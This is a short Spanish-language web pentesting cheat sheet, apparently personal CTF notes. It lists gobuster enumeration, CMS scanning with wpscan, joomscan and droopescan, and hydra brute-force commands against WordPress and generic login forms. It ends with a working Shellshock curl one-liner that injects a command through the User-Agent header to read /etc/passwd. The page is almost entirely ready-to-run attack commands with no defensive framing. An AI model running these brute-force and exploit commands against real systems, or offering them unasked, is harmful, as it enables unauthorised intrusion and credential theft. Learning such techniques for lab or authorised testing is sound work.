# HTTP
Protocolo de comunicación que permite las transferencias de información en la World Wide Web sirve como base para muchos otros servicios

## Gobuster
* Directorios
```
gobuster -u URL -w wordlist
```
* Scripts 
```
gobuster -u URL -w wordlist -x .js, .py, .phpX , .aspx , .sh
```
* Información sensible
```
gobuster -u URL -w wordlist -x .txt, .conf , .config , .bak
```

## Recon for CMS
### Averiguar tecnología
```
whatweb http://IP
nikto http://IP
```

### Wordpress
* Enumera wordpress
```
wpscan --url -e vp,u,cb,dbe
```
* Wordpress login bruteforce
```
wpscan --url URL --wordlist DICTIONARYPATH --username USERNAME
```
* Hydra bruteforce
```
hydra -L USERLIST -P PASSLIST IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" 
```
### joomla
* Joomscan
```
perl joomscan.pl -u URL
```
### Drupal
[Tool](https://github.com/droope/droopescan)
```
droopescan scan drupal http://IP -t 32
```

## Ataques por fuerza bruta
* Hydra POST 
```
hydra -L USERLIST -P PASSLIST IP http-post-form "/endpoint:USERPARAM=^USER^&PASSPARAM=^PASS^EXTRAPARAMS:FAILMESSAGE" 
```
### Hydra BruteForce HTTP GET
```
hydra -L UserList -P PassList IP http-get Directorio
```
## Vulnerabilidades comunes sin metasploit
### Shellshock cgi-bin
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://IP/cgi-bin/script.sh
```
